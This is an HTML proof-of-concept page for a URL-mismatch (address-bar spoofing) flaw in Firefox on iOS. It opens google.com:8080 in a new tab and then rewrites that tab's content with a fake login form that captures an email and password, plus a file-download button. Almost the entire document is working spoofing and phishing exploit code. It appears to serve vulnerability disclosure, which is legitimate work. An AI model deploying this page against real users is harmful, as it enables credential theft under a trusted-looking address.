<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Firefox iOS URL Mismatch PoC</title>

<script>
function go() {
    // Open trusted URL in new tab
    var w = window.open('https://www.google.com:8080', '_blank');

    // Delay to allow navigation
    setTimeout(function () {
        try {
            // Overwrite document content
            w.document.open();
            w.document.write(`
                <h1>Login</h1>
                Email:<br>
                <input id="email"><br><br>
                Password:<br>
                <input id="pass" type="password"><br><br>

                <button onclick="
                    alert(
                        'Email: ' + document.getElementById('email').value +
                        '\\nPass: ' + document.getElementById('pass').value
                    )
                ">
                    Login
                </button>

                <br><br>

                <button onclick="downloadFile()">Download Text File</button>
            `);
            w.document.close();
        } catch (e) {
            console.log('Blocked:', e);
        }
    }, 3000);
}

// Download helper
function downloadFile() {
    const fileUrl = 'https://www.example.com/path/to/your/file.txt';

    var a = document.createElement('a');
    a.href = fileUrl;
    a.download = 'file.txt';
    a.click();
}
</script>
</head>

<body>
<button onclick="go()">Go</button>
</body>
</html>
